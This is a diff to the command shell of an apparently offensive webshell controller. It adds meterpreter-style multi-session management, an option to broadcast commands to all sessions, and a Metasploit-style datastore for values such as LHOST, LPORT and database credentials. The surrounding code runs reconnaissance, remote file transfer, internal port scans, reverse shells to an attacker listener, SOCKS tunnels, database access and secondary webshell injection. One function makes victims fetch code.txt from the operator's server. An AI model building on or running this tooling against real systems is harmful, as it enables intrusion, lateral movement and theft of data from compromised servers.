@@ -76,7 +76,8 @@ class Repl(cmd2.Cmd):
         self._rc_cache: dict[str, tuple[float, list[str]]] = {}
         for name in ("edit", "macro", "run_pyscript", "run_script", "shortcuts"):
             self.hidden_commands.append(name)
-        self.aliases.update({"exit": "quit"})
+        self._broadcast = False  # set per-command by `--all` / `sessions -c`
+        self._install_aliases()
         self._load_plugins()
         self._refresh_prompt()
 
@@ -84,6 +85,26 @@ class Repl(cmd2.Cmd):
     @property
     def webshells(self) -> list[WebShell]:
         return self.session.shells
+
+    @property
+    def active(self) -> int:
+        return self.session.active
+
+    @active.setter
+    def active(self, value: int) -> None:
+        self.session.active = value
+
+    @property
+    def active_shell(self) -> WebShell | None:
+        """The session commands target by default (meterpreter-style)."""
+        shells = self.webshells
+        if not shells:
+            return None
+        return shells[self.active] if 0 <= self.active < len(shells) else shells[0]
+
+    @property
+    def store(self) -> dict[str, str]:
+        return self.session.store
 
     @property
     def cwd(self) -> str:
@@ -119,8 +140,8 @@ class Repl(cmd2.Cmd):
         else:
             chip = cmd2.stylize(" REMOTE ", _REMOTE_STYLE)
         cwd = self.cwd or "~"
-        count = f" ×{len(self.webshells)}" if len(self.webshells) > 1 else ""
-        self.prompt = f"{chip} {cwd}{count} > "
+        sid = f" [{self.active}]" if len(self.webshells) > 1 else ""
+        self.prompt = f"{chip}{sid} {cwd} > "
 
     def preloop(self) -> None:
         self._refresh_prompt()
@@ -130,11 +151,28 @@ class Repl(cmd2.Cmd):
         return stop
 
     # -- helpers --------------------------------------------------------------
-    def _each(self, action, label: str) -> None:
-        """Run ``action(ws)`` against every live webshell, isolating failures.
+    def _targets(self) -> list[WebShell]:
+        """The shells a command acts on: the active session, or all when broadcasting."""
+        if self._broadcast:
+            return list(self.webshells)
+        shell = self.active_shell
+        return [shell] if shell is not None else []
 
-        Runs concurrently when ``--workers`` > 1 and there's more than one shell.
+    def _require_active(self) -> WebShell | None:
+        """Return the active shell for single-session commands, or log + None."""
+        ws = self.active_shell
+        if ws is None:
+            log.error("No active session.")
+        return ws
+
+    def _each(self, action, label: str) -> None:
+        """Run ``action(ws)`` against the target shell(s), isolating failures.
+
+        Targets the active session by default; broadcasts to all shells when a
+        command sets ``--all`` (or via ``sessions -c``). Broadcasts run
+        concurrently when ``--workers`` > 1.
         """
+        targets = self._targets()
 
         def run(ws: WebShell) -> None:
             log.info(f"[{label}] {ws}")
@@ -143,11 +181,11 @@ class Repl(cmd2.Cmd):
             except WebshellError as exc:
                 log.error(f"{label} failed: {exc}")
 
-        if self.config.workers > 1 and len(self.webshells) > 1:
+        if self.config.workers > 1 and len(targets) > 1:
             with ThreadPoolExecutor(max_workers=self.config.workers) as pool:
-                list(pool.map(run, self.webshells))
+                list(pool.map(run, targets))
         else:
-            for ws in self.webshells:
+            for ws in targets:
                 run(ws)
 
     @staticmethod
@@ -200,9 +238,9 @@ class Repl(cmd2.Cmd):
         hit = self._rc_cache.get(directory)
         if hit and now - hit[0] < _RC_TTL:
             return hit[1]
-        if not self.webshells:
+        ws = self.active_shell
+        if ws is None:
             return []
-        ws = self.webshells[0]
         base = directory or self.cwd or ws.webroot or "."
         try:
             out = ws.run_command(f"ls -1ap {shlex.quote(base)} 2>/dev/null")
@@ -230,6 +268,8 @@ class Repl(cmd2.Cmd):
     # recon
     # ========================================================================
     _recon_parser = Cmd2ArgumentParser(prog="recon", description="Target reconnaissance.")
+    _recon_parser.add_argument("--all", action="store_true",
+                               help="run on ALL sessions (default: the active one)")
     _rsub = _recon_parser.add_subparsers(title="actions", metavar="<action>")
     _rsub.add_parser("info", help="target summary (URL/webroot/php/kernel)").set_defaults(fn="_recon_info")
     _rsub.add_parser("php", help="PHP version").set_defaults(fn="_recon_php")
@@ -248,7 +288,7 @@ class Repl(cmd2.Cmd):
         self._dispatch(args, self._recon_parser)
 
     def _recon_info(self, _) -> None:
-        for ws in self.webshells:
+        for ws in self._targets():
             log.success("=" * 40)
             log.success(f"URL           : {ws.url}")
             log.success(f"Method        : {ws.method}")
@@ -309,6 +349,8 @@ class Repl(cmd2.Cmd):
     # file
     # ========================================================================
     _file_parser = Cmd2ArgumentParser(prog="file", description="Remote file operations.")
+    _file_parser.add_argument("--all", action="store_true",
+                              help="run on ALL sessions (default: the active one)")
     _fsub = _file_parser.add_subparsers(title="actions", metavar="<action>")
     _p = _fsub.add_parser("ls", help="list a remote directory (table)")
     _p.add_argument("path", nargs="?", completer=_complete_remote_path)
@@ -360,7 +402,7 @@ class Repl(cmd2.Cmd):
 
     def _file_ls(self, args) -> None:
         path = args.path or self.cwd or "."
-        for ws in self.webshells:
+        for ws in self._targets():
             log.info(f"[ls] {ws}: {path}")
             try:
                 rows = [
@@ -378,7 +420,9 @@ class Repl(cmd2.Cmd):
         self._each(lambda ws: log.raw(files.read_file(ws, path)), "read")
 
     def _file_edit(self, args) -> None:
-        ws = self.webshells[0]
+        ws = self._require_active()
+        if ws is None:
+            return
         try:
             data = files.read_bytes(ws, args.path)
         except WebshellError as exc:
@@ -394,7 +438,7 @@ class Repl(cmd2.Cmd):
             os.unlink(tmp)
 
     def _file_get(self, args) -> None:
-        for ws in self.webshells:
+        for ws in self._targets():
             path = self._resolve(args.path, "Remote path", ws.webroot)
             log.info(f"[download] {ws}")
             try:
@@ -413,7 +457,7 @@ class Repl(cmd2.Cmd):
         if not local or not Path(local).is_file():
             log.error("Local file not found.")
             return
-        for ws in self.webshells:
+        for ws in self._targets():
             default_remote = f"{ws.webroot}/{Path(local).name}"
             if args.remote is not None:
                 remote = args.remote
@@ -462,6 +506,8 @@ class Repl(cmd2.Cmd):
     # pivot
     # ========================================================================
     _pivot_parser = Cmd2ArgumentParser(prog="pivot", description="Lateral movement and tunnelling.")
+    _pivot_parser.add_argument("--all", action="store_true",
+                               help="run on ALL sessions (default: the active one)")
     _psub = _pivot_parser.add_subparsers(title="actions", metavar="<action>")
     _p = _psub.add_parser("scan", help="port-scan a CIDR range from the target")
     _p.add_argument("--hosts", help="CIDR range, e.g. 192.168.1.0/24")
@@ -497,8 +543,8 @@ class Repl(cmd2.Cmd):
         self._dispatch(args, self._pivot_parser)
 
     def _pivot_scan(self, args) -> None:
-        hosts = self._resolve(args.hosts, "Hosts (CIDR)", "192.168.1.0/24")
-        ports = self._resolve(args.ports, "Ports", "21,22,80,443,445,3306,3389")
+        hosts = self._resolve(args.hosts or self._stored("RANGE"), "Hosts (CIDR)", "192.168.1.0/24")
+        ports = self._resolve(args.ports or self._stored("PORTS"), "Ports", "21,22,80,443,445,3306,3389")
         banner = args.banner  # optional toggle: opt in with --banner (never prompts)
 
         def run(ws: WebShell) -> None:
@@ -512,11 +558,14 @@ class Repl(cmd2.Cmd):
         self._each(run, "portscan")
 
     def _pivot_shell(self, args) -> None:
-        ip = self._resolve(args.ip, "Listener IP", get_ip_address())
-        port = int(self._resolve(args.port, "Listener port", "8888"))
+        ip = self._resolve(args.ip or self._stored("LHOST"), "Listener IP", get_ip_address())
+        port = int(self._resolve(args.port or self._stored("LPORT"), "Listener port", "8888"))
         listen = args.listen  # optional toggle: opt in with --listen (never prompts)
         if listen:
-            revshell.reverse_shell_with_listener(self.webshells[0], ip, port, args.method, args.tool)
+            ws = self._require_active()
+            if ws is None:
+                return
+            revshell.reverse_shell_with_listener(ws, ip, port, args.method, args.tool)
         else:
             log.info(f"Start your listener first, e.g.: nc -lvnp {port}")
             self._each(lambda ws: revshell.reverse_shell(ws, ip, port, args.method), "revshell")
@@ -526,7 +575,9 @@ class Repl(cmd2.Cmd):
 
     def _pivot_socks(self, args) -> None:
         port = args.port if args.port is not None else int(self._resolve(None, "Local SOCKS port", "1080"))
-        ws = self.webshells[0]
+        ws = self._require_active()
+        if ws is None:
+            return
         try:
             url = tunnel.plant(ws)
         except WebshellError as exc:
@@ -541,12 +592,13 @@ class Repl(cmd2.Cmd):
             log.info("SOCKS5 proxy stopped.")
 
     def _pivot_db(self, args) -> None:
-        engine = self._resolve(args.engine, "Engine (mysql/pgsql)", "mysql")
-        host = self._resolve(args.host, "Host", "127.0.0.1")
-        user = self._resolve(args.user, "Username", "root")
-        password = self._resolve(args.password, "Password", "root")
-        db = self._resolve_optional(args.database, "Database (blank = default)", "") if engine == "pgsql" else ""
-        for ws in self.webshells:
+        engine = self._resolve(args.engine or self._stored("DB_ENGINE"), "Engine (mysql/pgsql)", "mysql")
+        host = self._resolve(args.host or self._stored("DB_HOST"), "Host", "127.0.0.1")
+        user = self._resolve(args.user or self._stored("DB_USER"), "Username", "root")
+        password = self._resolve(args.password or self._stored("DB_PASS"), "Password", "root")
+        db = (self._resolve_optional(args.database or self._stored("DB_NAME"),
+                                     "Database (blank = default)", "") if engine == "pgsql" else "")
+        for ws in self._targets():
             log.info(f"[database:{engine}] {ws}")
             try:
                 client = database.make_client(engine, ws, host, user, password, db)
@@ -563,6 +615,8 @@ class Repl(cmd2.Cmd):
     # inject
     # ========================================================================
     _inject_parser = Cmd2ArgumentParser(prog="inject", description="Secondary webshell injection.")
+    _inject_parser.add_argument("--all", action="store_true",
+                                help="run on ALL sessions (default: the active one)")
     _isub = _inject_parser.add_subparsers(title="actions", metavar="<action>")
     _p = _isub.add_parser("web", help="auto-inject a plain webshell")
     _p.add_argument("--password", help="blank = random per directory")
@@ -601,7 +655,7 @@ class Repl(cmd2.Cmd):
         )
 
     def _inject_reaper(self, args) -> None:
-        host = self._resolve(args.host, "Your web server IP", get_ip_address())
+        host = self._resolve(args.host or self._stored("LHOST"), "Your web server IP", get_ip_address())
         port = self._resolve(args.port, "Your web server port", "80")
         code_url = f"http://{host}:{port}/code.txt"
         self._each(
@@ -618,7 +672,11 @@ class Repl(cmd2.Cmd):
         if fn is None:
             log.raw(parser.format_help())
             return
-        getattr(self, fn)(args)
+        self._broadcast = getattr(args, "all", False)
+        try:
+            getattr(self, fn)(args)
+        finally:
+            self._broadcast = False
 
     def _remote_command(self, ws: WebShell, command: str) -> str:
         """Run a command on the target, honouring the client-tracked cwd."""
@@ -647,7 +705,9 @@ class Repl(cmd2.Cmd):
     def do_cd(self, args) -> None:
         """cd [path] — change the (client-tracked) remote working directory."""
         arg = args.path or "."
-        ws = self.webshells[0]
+        ws = self._require_active()
+        if ws is None:
+            return
         base = self.cwd or ws.webroot
         target = arg if arg.startswith("/") else f"{base}/{arg}"
         try:
@@ -679,6 +739,103 @@ class Repl(cmd2.Cmd):
             subprocess.run(command, shell=True)  # noqa: S602 - intentional local exec
         else:
             self._each(lambda ws: log.raw(self._remote_command(ws, command)), "remote")
+
+    # ========================================================================
+    # sessions (meterpreter-style multi-target management)
+    # ========================================================================
+    def _install_aliases(self) -> None:
+        """Long-form + meterpreter-style aliases so msf muscle memory carries over."""
+        self.aliases.update({
+            "exit": "quit",
+            "bg": "background",
+            "setg": "set",
+            "show": "options",
+            # meterpreter command names -> our namespaced / exec equivalents
+            "sysinfo": "recon info",
+            "getuid": "exec id",
+            "getwd": "pwd",
+            "download": "file get",
+            "upload": "file put",
+            "cat": "file read",
+            "ls": "file ls",
+            "ps": "exec ps aux",
+            "ifconfig": "exec ip addr",
+            "netstat": "exec ss -tlnp",
+        })
+
+    def _list_sessions(self) -> None:
+        rows = [["*" if i == self.active else "", str(i), ws.method, ws.url]
+                for i, ws in enumerate(self.webshells)]
+        log.table(["", "id", "method", "url"], rows)
+
+    _sessions_parser = Cmd2ArgumentParser(
+        prog="sessions", description="List loaded sessions; switch or broadcast.")
+    _sessions_parser.add_argument("-i", "--interact", type=int, metavar="ID",
+                                  help="make session ID the active one")
+    _sessions_parser.add_argument("-c", "--command", metavar="CMD",
+                                  help="run a shell command on ALL sessions")
+
+    @with_argparser(_sessions_parser)
+    def do_sessions(self, args) -> None:
+        """List sessions; `-i <id>` to switch the active one, `-c <cmd>` to run on all."""
+        if args.command is not None:
+            self._broadcast = True
+            try:
+                self._each(lambda ws: log.raw(self._remote_command(ws, args.command)), "broadcast")
+            finally:
+                self._broadcast = False
+        elif args.interact is not None:
+            if 0 <= args.interact < len(self.webshells):
+                self.active = args.interact
+                self._invalidate_remote_cache()
+                log.success(f"Active session -> [{self.active}] {self.active_shell}")
+            else:
+                last = len(self.webshells) - 1
+                log.error(f"No session {args.interact} (have 0..{last}).")
+        else:
+            self._list_sessions()
+
+    def do_background(self, _: cmd2.Statement) -> None:
+        """List sessions to step back and pick another (meterpreter `background`)."""
+        self._list_sessions()
+
+    # ========================================================================
+    # datastore (msf-style: set once, reused as defaults)
+    # ========================================================================
+    _DATASTORE_KEYS = ["LHOST", "LPORT", "RANGE", "PORTS",
+                       "DB_ENGINE", "DB_HOST", "DB_USER", "DB_PASS", "DB_NAME"]
+
+    def _stored(self, key: str):
+        """The datastore value for ``key`` (used like a pre-supplied flag), or None."""
+        return self.store.get(key) or None
+
+    _set_parser = Cmd2ArgumentParser(prog="set", description="Store a value used as a default later.")
+    _set_parser.add_argument("key")
+    _set_parser.add_argument("value", nargs="+")
+
+    @with_argparser(_set_parser)
+    def do_set(self, args) -> None:
+        """set <KEY> <VALUE> — store a setting (LHOST/LPORT/RANGE/DB_*) reused as a default."""
+        key = args.key.upper()
+        self.store[key] = " ".join(args.value)
+        log.success(f"{key} => {self.store[key]}")
+
+    _unset_parser = Cmd2ArgumentParser(prog="unset")
+    _unset_parser.add_argument("key")
+
+    @with_argparser(_unset_parser)
+    def do_unset(self, args) -> None:
+        """unset <KEY> — clear a datastore setting."""
+        key = args.key.upper()
+        if self.store.pop(key, None) is not None:
+            log.success(f"Unset {key}")
+        else:
+            log.warning(f"{key} was not set.")
+
+    def do_options(self, _: cmd2.Statement) -> None:
+        """Show the datastore (settings used as defaults by pivot/inject)."""
+        keys = list(dict.fromkeys(self._DATASTORE_KEYS + sorted(self.store)))
+        log.table(["setting", "value"], [[k, self.store.get(k, "")] for k in keys])
 
     # ========================================================================
     # session
@@ -814,6 +971,10 @@ with contextlib.suppress(Exception):
     cmd2.categorize(
         [Repl.do_cd, Repl.do_pwd, Repl.do_exec, Repl.do_local, Repl.do_remote],
         "Shell",
+    )
+    cmd2.categorize(
+        [Repl.do_sessions, Repl.do_background, Repl.do_set, Repl.do_unset, Repl.do_options],
+        "Sessions & datastore",
     )
     cmd2.categorize(
         [Repl.do_history, Repl.do_save, Repl.do_version, Repl.do_quit],
